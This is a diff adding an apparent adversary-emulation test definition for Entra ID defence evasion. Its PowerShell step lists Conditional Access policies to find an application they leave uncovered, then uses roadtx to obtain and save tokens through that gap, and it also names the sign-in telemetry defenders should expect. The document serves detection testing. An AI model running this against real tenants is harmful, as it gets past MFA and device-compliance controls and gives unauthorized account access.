@@ -1,0 +1,83 @@
+attack_technique: T1078.004
+display_name: "Defense Evasion – Conditional Access Gap Authentication"
+atomic_tests:
+  - name: "CA gap authentication via unprotected application"
+    auto_generated_guid: c9d0e1f2-a3b4-5678-cdef-678901234508
+    description: |
+      Authenticates using an Entra application that is not covered by the
+      tenant's Conditional Access policies (e.g., an old service principal,
+      an unregistered first-party app, or a guest-accessible app). This is a
+      custom primitive (allowed gap #2 in wrap-don't-write policy): roadtx
+      does not expose a CA gap finder, so we enumerate unprotected apps via
+      Microsoft.Graph and then authenticate through the discovered gap.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      gap_client_id:
+        description: "Client ID of an application not covered by CA policies."
+        type: String
+      resource:
+        description: "Target resource URI."
+        type: String
+        default: "https://graph.microsoft.com"
+      token_output_path:
+        description: "Path to write the resulting token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        # Enumerate CA policies and identify unprotected apps (custom gap-finder primitive).
+        Import-Module Microsoft.Graph.Identity.SignIns -ErrorAction Stop
+        Connect-MgGraph -TenantId '#{tenant_id}' -Scopes 'Policy.Read.All' -NoWelcome
+
+        $policies      = Get-MgIdentityConditionalAccessPolicy -All
+        $includedApps  = @()
+        $excludedApps  = @()
+
+        foreach ($pol in $policies | Where-Object { $_.State -eq 'enabled' }) {
+            $cond = $pol.Conditions.Applications
+            if ($cond.IncludeApplications) {
+                $includedApps += $cond.IncludeApplications
+            }
+            if ($cond.ExcludeApplications) {
+                $excludedApps += $cond.ExcludeApplications
+            }
+        }
+
+        $gapAppId = '#{gap_client_id}'
+        if ($includedApps -contains 'All' -and $excludedApps -notcontains $gapAppId) {
+            Write-Warning "App '$gapAppId' appears to be covered by CA policies."
+        } else {
+            Write-Host "App '$gapAppId' is not covered by all-apps CA policies – proceeding."
+        }
+
+        roadtx gettokens `
+          --device-code `
+          --client '#{gap_client_id}' `
+          --resource '#{resource}' `
+          --tenant '#{tenant_id}' `
+          --tokenfile '#{token_output_path}'
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-cloud-apps"
+    auth_profile: "ca-gap"
+    defense_evasion: "Authenticates through an app not subject to MFA or compliant-device CA policies"
+    requires_token: false
+    expected_telemetry:
+      - source: entra_signin
+        match:
+          conditionalAccessStatus: "notApplied"
+        within_minutes: 15
+    exercises_chokepoint:
+      id: "DC-EVAS-005"
+      url: "https://detectionchokepoints.com/evasion/ca-gap"
